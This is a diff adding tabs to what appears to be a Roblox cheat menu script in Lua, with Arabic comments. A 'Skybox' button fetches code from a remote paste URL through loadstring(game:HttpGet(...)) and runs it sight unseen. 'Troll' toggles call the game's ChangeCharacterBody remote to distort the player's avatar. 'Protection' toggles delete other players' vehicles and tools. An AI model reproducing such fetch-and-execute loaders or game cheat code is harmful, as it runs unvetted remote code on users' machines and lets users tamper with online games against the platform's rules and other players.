@@ -6045,3 +6045,598 @@ HeadSitTab:AddButton({
         refreshHeadSitDropdown()
     end
 })
+
+--[====[
+    ================================================
+    علامة التبويب: SKYBOX (تغيير خلفية السماء)
+    ================================================
+]====]
+local TrollTab = Window:MakeTab({ Title = "سكاي بوكس", Icon = "cloud" })
+
+TrollTab:AddSection({ "Skybox by DBLACK" })
+
+--[====[
+    زر عادي: يطبق سكربت خارجي لتغيير شكل السماء.
+]====]
+TrollTab:AddButton({
+ Name = "سكاي بوكس",
+ Callback = function()
+   loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/qZkSict1retkqFIr/raw"))()
+   end
+})
+
+--[====[
+    متغيرات لتتبع حالة تأثير Nuke Skybox.
+]====]
+local skyboxEnabled = false
+local skyboxTrack = nil
+local rigidTrack = nil
+local savedNukeBody = {}
+
+--[====[
+    دالة مساعدة: توقف جميع الحركات (الأنيميشن) الخاصة بتأثير Nuke.
+]====]
+local function stopAllAnimations()
+    if rigidTrack then
+        pcall(function()
+            rigidTrack:Stop()
+            rigidTrack:Destroy()
+        end)
+        rigidTrack = nil
+    end
+    
+    if skyboxTrack then
+        pcall(function()
+            skyboxTrack:Stop()
+            skyboxTrack:Destroy()
+        end)
+        skyboxTrack = nil
+    end
+    
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+    if character then
+        local humanoid = character:FindFirstChild("Humanoid")
+        if humanoid then
+            local animator = humanoid:FindFirstChild("Animator")
+            if animator then
+                for _, track in pairs(animator:GetPlayingAnimationTracks()) do
+                    if track.Animation then
+                        local animId = track.Animation.AnimationId
+                        if animId == "rbxassetid://70883871260184" or animId == "rbxassetid://3695333486" then
+                            pcall(function()
+                                track:Stop()
+                            end)
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+--[====[
+    تأثير Nuke Skybox:
+    - يغير شكل اللاعب إلى هيئة غريبة.
+    - يجعل اللاعب يقوم بحركات (أنيميشن) غير طبيعية.
+]====]
+TrollTab:AddToggle({
+    Name = "Nuke Skybox", -- اسم التأثير
+    Default = false,
+    Callback = function(value)
+        skyboxEnabled = value
+        
+        if value then -- إذا تم تفعيل التأثير
+            local player = game.Players.LocalPlayer
+            local character = player.Character
+            
+            if character then
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    local description = humanoid:GetAppliedDescription()
+                    
+                    -- حفظ شكل اللاعب الحالي لاستعادته لاحقًا
+                    savedNukeBody = {
+                        Torso = description.Torso,
+                        RightArm = description.RightArm,
+                        LeftArm = description.LeftArm,
+                        RightLeg = description.RightLeg,
+                        LeftLeg = description.LeftLeg,
+                        Head = description.Head
+                    }
+                    
+                    task.wait(0.2)
+                    
+                    -- تغيير شكل اللاعب إلى هيئة "النوكل"
+                    local args = {
+                        [1] = 123402086843885,
+                        [2] = 100839513065432,
+                        [3] = 78300682916056,
+                        [4] = 86276701020724,
+                        [5] = 78409653958165,
+                        [6] = 15093053680
+                    }
+                    
+                    pcall(function()
+                        game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(args)
+                    end)
+                    
+                    task.wait(0.3)
+                    
+                    -- تشغيل حركة (أنيميشن) غريبة
+                    local newAnim = Instance.new("Animation")
+                    newAnim.AnimationId = "rbxassetid://70883871260184"
+                    
+                    skyboxTrack = humanoid:LoadAnimation(newAnim)
+                    skyboxTrack.Priority = Enum.AnimationPriority.Action4
+                    skyboxTrack:Play(0.1, 1, 0.01)
+                    
+                    task.wait(0.5)
+                    
+                    -- تشغيل حركة إضافية
+                    local plankAnim = Instance.new("Animation")
+                    plankAnim.AnimationId = "rbxassetid://3695333486"
+                    rigidTrack = humanoid:LoadAnimation(plankAnim)
+                    rigidTrack.Priority = Enum.AnimationPriority.Movement
+                    rigidTrack:Play(0.1, 1, 0)
+                end
+            end
+        else -- إذا تم إلغاء تفعيل التأثير
+            stopAllAnimations() -- إيقاف جميع الحركات
+            
+            task.wait(0.2)
+            
+            -- استعادة شكل اللاعب الأصلي
+            if next(savedNukeBody) then
+                local player = game.Players.LocalPlayer
+                local character = player.Character
+                
+                if character then
+                    local humanoid = character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        local restoreBody = {
+                            [1] = savedNukeBody.Torso,
+                            [2] = savedNukeBody.RightArm,
+                            [3] = savedNukeBody.LeftArm,
+                            [4] = savedNukeBody.RightLeg,
+                            [5] = savedNukeBody.LeftLeg,
+                            [6] = savedNukeBody.Head
+                        }
+                        
+                        local args = {
+                            [1] = restoreBody
+                        }
+                        
+                        pcall(function()
+                            game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
+                        end)
+                        
+                        savedNukeBody = {}
+                    end
+                end
+            end
+        end
+    end
+})
+
+--[====[
+    تأثير Nuke FlashBack:
+    - مشابه لتأثير Nuke ولكن بحركة أسرع (Flash).
+]====]
+local nukeFlashEnabled = false
+local nukeFlashTrack = nil
+local flashRigidTrack = nil
+local savedNukeFlashBody = {}
+
+local function stopFlashAnimations()
+    if flashRigidTrack then
+        pcall(function()
+            flashRigidTrack:Stop()
+            flashRigidTrack:Destroy()
+        end)
+        flashRigidTrack = nil
+    end
+    
+    if nukeFlashTrack then
+        pcall(function()
+            nukeFlashTrack:Stop()
+            nukeFlashTrack:Destroy()
+        end)
+        nukeFlashTrack = nil
+    end
+end
+
+TrollTab:AddToggle({
+    Name = "Nuke FlashBack",
+    Default = false,
+    Callback = function(value)
+        nukeFlashEnabled = value
+        
+        if value then
+            local player = game.Players.LocalPlayer
+            local character = player.Character
+            
+            if character then
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    local description = humanoid:GetAppliedDescription()
+                    
+                    savedNukeFlashBody = {
+                        Torso = description.Torso,
+                        RightArm = description.RightArm,
+                        LeftArm = description.LeftArm,
+                        RightLeg = description.RightLeg,
+                        LeftLeg = description.LeftLeg,
+                        Head = description.Head
+                    }
+                    
+                    task.wait(0.2)
+                    
+                    local args = {
+                        [1] = 123402086843885,
+                        [2] = 100839513065432,
+                        [3] = 78300682916056,
+                        [4] = 86276701020724,
+                        [5] = 78409653958165,
+                        [6] = 15093053680
+                    }
+                    
+                    pcall(function()
+                        game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(args)
+                    end)
+                    
+                    task.wait(0.3)
+                    
+                    local newAnim = Instance.new("Animation")
+                    newAnim.AnimationId = "rbxassetid://70883871260184"
+                    
+                    nukeFlashTrack = humanoid:LoadAnimation(newAnim)
+                    nukeFlashTrack.Priority = Enum.AnimationPriority.Action4
+                    nukeFlashTrack:Play(0.1, 1, 1)
+                    
+                    task.wait(0.1)
+                    nukeFlashTrack:AdjustSpeed(5) -- زيادة سرعة الحركة
+                    
+                    task.wait(0.3)
+                    
+                    local plankAnim = Instance.new("Animation")
+                    plankAnim.AnimationId = "rbxassetid://3695333486"
+                    flashRigidTrack = humanoid:LoadAnimation(plankAnim)
+                    flashRigidTrack.Priority = Enum.AnimationPriority.Movement
+                    flashRigidTrack:Play(0.1, 1, 0)
+                end
+            end
+        else
+            stopFlashAnimations()
+            
+            task.wait(0.2)
+            
+            if next(savedNukeFlashBody) then
+                local player = game.Players.LocalPlayer
+                local character = player.Character
+                
+                if character then
+                    local humanoid = character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        local restoreBody = {
+                            [1] = savedNukeFlashBody.Torso,
+                            [2] = savedNukeFlashBody.RightArm,
+                            [3] = savedNukeFlashBody.LeftArm,
+                            [4] = savedNukeFlashBody.RightLeg,
+                            [5] = savedNukeFlashBody.LeftLeg,
+                            [6] = savedNukeFlashBody.Head
+                        }
+                        
+                        local args = {
+                            [1] = restoreBody
+                        }
+                        
+                        pcall(function()
+                            game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
+                        end)
+                        
+                        savedNukeFlashBody = {}
+                    end
+                end
+            end
+        end
+    end
+})
+
+--[====[
+    ================================================
+    علامة التبويب: PROTECTIONS (الحماية والمضادات)
+    ================================================
+]====]
+local Tab13 = Window:MakeTab({"مضادات By dblack", "rbxassetid://90798133906684"})
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+
+--[====[
+    جدول لحفظ نسخ احتياطية من العناصر (المركبات، الزوارق، الطائرات، الكرات).
+    الفكرة: قبل حذف أي عنصر لا يخصنا، نقوم بحفظ نسخة منه، حتى نتمكن من استعادته
+    لاحقًا عند إيقاف خاصية الحماية.
+    هذا يمنع فقدان العناصر الأخرى في السيرفر نهائيًا.
+]====]
+local backupTables = {
+    Vehicles = {},   -- للسيارات
+    Canoes = {},     -- للزوارق (القوارب العادية)
+    Jets = {},       -- للطائرات النفاثة
+    Helis = {},      -- للطائرات العمودية (الهليكوبتر)
+    Balls = {}       -- لكرات القدم
+}
+
+local TeleportCarro = {}
+function TeleportCarro:MostrarNotificacao(msg)
+    print("🔒 "..msg) -- طباعة رسالة في Console بدلاً من إشعار داخل اللعبة
+end
+
+--[====[
+    دالة مساعدة أساسية: تقوم بإنشاء حلقة (Loop) تعمل بشكل متكرر.
+    هذه الدالة هي القلب النابض لجميع مضادات الـ Fling.
+    الوظيفة: تبحث باستمرار عن عناصر معينة (مثل الزوارق، الطائرات) في مجلداتها.
+    إذا وجدت عنصرًا لا يخص اللاعب (أي عنصر يمكن استخدامه لتنفيذ Fling ضدك)،
+    تقوم بحذفه لمنع الخطر، ولكن قبل الحذف، تحفظ نسخة منه في `backupTables`.
+    - name: اسم نوع العنصر (للتخزين في الجدول الاحتياطي).
+    - getFolderFunc: دالة ترجع المجلد الذي توجد فيه هذه العناصر.
+]====]
+local function AntiFlingLoop(name, getFolderFunc)
+    local active = false
+    task.spawn(function()
+        while true do
+            if active and LocalPlayer.Character then
+                local folder = getFolderFunc()
+                if folder then
+                    for _, item in ipairs(folder:GetChildren()) do
+                        local isMine = false
+                        -- التحقق مما إذا كان العنصر يخص اللاعب المحلي
+                        if name == "Vehicles" then
+                            -- للسيارات: نتحقق إذا كان أي كرسي في السيارة يجلس عليه اللاعب
+                            for _, seat in ipairs(item:GetDescendants()) do
+                                if (seat:IsA("VehicleSeat") or seat:IsA("Seat")) and seat.Occupant and seat.Occupant.Parent == LocalPlayer.Character then
+                                    isMine = true
+                                    break
+                                end
+                            end
+                        elseif name == "Canoes" then
+                            -- للزوارق: نتحقق من وجود متغير (Value) اسمه Owner وقيمته تساوي اللاعب
+                            local owner = item:FindFirstChild("Owner")
+                            isMine = owner and owner.Value == LocalPlayer
+                        elseif name == "Jets" or name == "Helis" then
+                            -- للطائرات: اسم العنصر نفسه هو اسم اللاعب (عادةً)
+                            isMine = item.Name == LocalPlayer.Name
+                        end
+                        
+                        -- إذا كان العنصر لا يخصنا، نقوم بحذفه بعد حفظ نسخة منه
+                        if not isMine then
+                            table.insert(backupTables[name], item:Clone())
+                            item:Destroy()
+                        end
+                    end
+                end
+            end
+            task.wait(0.03) -- ننتظر 0.03 ثانية قبل تكرار الحلقة (سرعة عالية)
+        end
+    end)
+    -- هذه الدالة ترجع دالة أخرى يتم استدعائها عند تشغيل/إيقاف التبديل (Toggle)
+    return function(state)
+        active = state
+        TeleportCarro:MostrarNotificacao(name.." "..(state and "مُفعل!" or "مُعطل!"))
+        if not state then
+            -- عند إيقاف التشغيل، نقوم باستعادة جميع العناصر التي حذفناها سابقًا
+            for _, item in ipairs(backupTables[name]) do
+                local parentFolder = getFolderFunc()
+                if parentFolder then 
+                    item.Parent = parentFolder 
+                end
+            end
+            backupTables[name] = {} -- تفريغ الجدول الاحتياطي بعد الاستعادة
+        end
+    end
+end
+
+--[====[
+    مضاد Fling الزوارق (Canoe):
+    يمنع استخدام الزوارق كأداة Fling ضدك.
+]====]
+Tab13:AddToggle({
+    Name = "مضاد Fling الزوارق", -- Anti Canoe Fling
+    Description = "يمنع استخدام الزوارق لقذفك",
+    Default = false,
+    Callback = AntiFlingLoop("Canoes", function()
+        local workspaceCom = Workspace:FindFirstChild("WorkspaceCom")
+        return workspaceCom and workspaceCom:FindFirstChild("001_CanoeStorage")
+    end)
+})
+
+--[====[
+    مضاد Fling الطائرات النفاثة (Jets):
+    يمنع استخدام الطائرات كأداة Fling ضدك.
+]====]
+Tab13:AddToggle({
+    Name = "مضاد Fling الطائرات", -- Anti Fling Jets
+    Description = "يمنع استخدام الطائرات لقذفك",
+    Default = false,
+    Callback = AntiFlingLoop("Jets", function()
+        local folder = Workspace:FindFirstChild("WorkspaceCom")
+        if folder and folder:FindFirstChild("001_Airport") then
+            local storage = folder["001_Airport"]:FindFirstChild("AirportHanger")
+            if storage then 
+                return storage:FindFirstChild("001_JetStorage") and storage["001_JetStorage"]:FindFirstChild("JetAirport") 
+            end
+        end
+    end)
+})
+
+--[====[
+    مضاد Fling الطائرات العمودية (Helicopters):
+    يمنع استخدام الطائرات العمودية كأداة Fling ضدك.
+]====]
+Tab13:AddToggle({
+    Name = "مضاد Fling الهليكوبتر", -- Anti Fling Helicopteros
+    Description = "يمنع استخدام الهليكوبتر لقذفك",
+    Default = false,
+    Callback = AntiFlingLoop("Helis", function()
+        local folder = Workspace:FindFirstChild("WorkspaceCom")
+        return folder and folder:FindFirstChild("001_HeliStorage") and folder["001_HeliStorage"]:FindFirstChild("PoliceStationHeli")
+    end)
+})
+
+--[====[
+    مضاد Fling الكرة (Ball):
+    يمنع استخدام كرة القدم كأداة Fling ضدك.
+]====]
+Tab13:AddToggle({
+    Name = "مضاد Fling الكرة", -- Anti Fling Ball
+    Description = "يمنع استخدام الكرة لقذفك",
+    Default = false,
+    Callback = AntiFlingLoop("Balls", function()
+        local folder = Workspace:FindFirstChild("WorkspaceCom")
+        return folder and folder:FindFirstChild("001_SoccerBalls")
+    end)
+})
+
+--[====[
+    خاصية Anti Sit (منع الجلوس):
+    تمنع شخصيتك من الجلوس قسرًا. بعض طرق القتل تعتمد على إجبارك على الجلوس
+    في مقعد سيارة أو أريكة ثم قتلك. هذه الخاصية تعطل خاصية الجلوس لديك.
+]====]
+local antiSitActive = false
+Tab13:AddToggle({
+    Name = "مضاد الجلوس القسري", -- Anti Sit
+    Description = "يمنع إجبارك على الجلوس",
+    Default = false,
+    Callback = function(state)
+        antiSitActive = state
+        TeleportCarro:MostrarNotificacao("Anti Sit "..(state and "مُفعل!" or "مُعطل!"))
+        task.spawn(function()
+            while antiSitActive and LocalPlayer.Character do
+                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    -- تعطيل حالة الجلوس نهائيًا
+                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+                    -- إذا كان جالسًا بالفعل، نجعله يقف
+                    if humanoid:GetState() == Enum.HumanoidStateType.Seated then
+                        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+                    end
+                end
+                task.wait(0.05)
+            end
+            -- عند إيقاف التشغيل، نعيد تفعيل الجلوس بشكل طبيعي
+            if not antiSitActive then
+                local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+                end
+            end
+        end)
+    end
+})
+
+--[====[
+    خاصية Anti-Lag (مضاد البطء):
+    هذه الخاصية تقوم بحذف الأدوات (Tools) المكررة لدى اللاعبين الآخرين.
+    وجود أدوات مكررة بكثرة (مثل 50 أريكة) قد يسبب بطء شديد في السيرفر أو تعطيله.
+    هذه الخاصية تحاول منع ذلك.
+]====]
+Tab13:AddToggle({
+    Name = "مضاد البطء (Anti-Lag)", -- Anti-Lag
+    Description = "يزيل الأدوات المكررة لتقليل البطء",
+    Default = false,
+    Callback = function(state)
+        local Players = game:GetService("Players")
+        local dedupLock = {}
+        local IGNORED_PLAYER
+
+        if not state then return end
+
+        local function marcarIgnorado(player)
+            IGNORED_PLAYER = player
+        end
+
+        local function isTargetTool(inst)
+            return inst:IsA("Tool")
+        end
+
+        -- دالة لجمع كل الأدوات التي يمتلكها اللاعب (في الشخصية، الحقيبة، والمخزن)
+        local function gatherTools(player)
+            local found = {}
+            local containers = {}
+            if player.Character then table.insert(containers, player.Character) end
+            local backpack = player:FindFirstChildOfClass("Backpack")
+            if backpack then table.insert(containers, backpack) end
+            local sg = player:FindFirstChild("StarterGear")
+            if sg then table.insert(containers, sg) end
+            for _, container in ipairs(containers) do
+                for _, child in ipairs(container:GetChildren()) do
+                    if isTargetTool(child) then table.insert(found, child) end
+                end
+            end
+            return found
+        end
+
+        -- دالة لإزالة الأدوات المكررة للاعب معين
+        local function dedupePlayer(player)
+            if player == IGNORED_PLAYER then return end
+            if dedupLock[player] then return end
+            dedupLock[player] = true
+            local tools = gatherTools(player)
+            if #tools > 1 then
+                -- نترك الأداة الأولى ونحذف الباقي
+                for i = 2, #tools do 
+                    pcall(function() tools[i]:Destroy() end) 
+                end
+            end
+            dedupLock[player] = false
+        end
+
+        -- ربط الدوال بأحداث دخول اللاعبين
+        local function hookPlayer(player)
+            if not IGNORED_PLAYER then marcarIgnorado(player) end
+            task.defer(dedupePlayer, player)
+            local function setupChar(char)
+                task.delay(0.5, function() dedupePlayer(player) end)
+                char.ChildAdded:Connect(function(child)
+                    if isTargetTool(child) then 
+                        task.delay(0.1, function() dedupePlayer(player) end) 
+                    end
+                end)
+            end
+            if player.Character then setupChar(player.Character) end
+            player.CharacterAdded:Connect(setupChar)
+            local backpack = player:WaitForChild("Backpack", 10)
+            if backpack then
+                backpack.ChildAdded:Connect(function(child)
+                    if isTargetTool(child) then 
+                        task.delay(0.1, function() dedupePlayer(player) end) 
+                    end
+                end)
+            end
+            local sg = player:FindFirstChild("StarterGear") or player:WaitForChild("StarterGear", 10)
+            if sg then
+                sg.ChildAdded:Connect(function(child)
+                    if isTargetTool(child) then 
+                        task.delay(0.1, function() dedupePlayer(player) end) 
+                    end
+                end)
+            end
+        end
+
+        Players.PlayerAdded:Connect(hookPlayer)
+        for _, plr in ipairs(Players:GetPlayers()) do 
+            hookPlayer(plr) 
+        end
+
+        -- حلقة دورية لتنظيف الأدوات المكررة كل ثانيتين
+        task.spawn(function()
+            while state do
+                for _, plr in ipairs(Players:GetPlayers()) do 
+                    dedupePlayer(plr) 
+                end
+                task.wait(2)
+            end
+        end)
+    end
+})
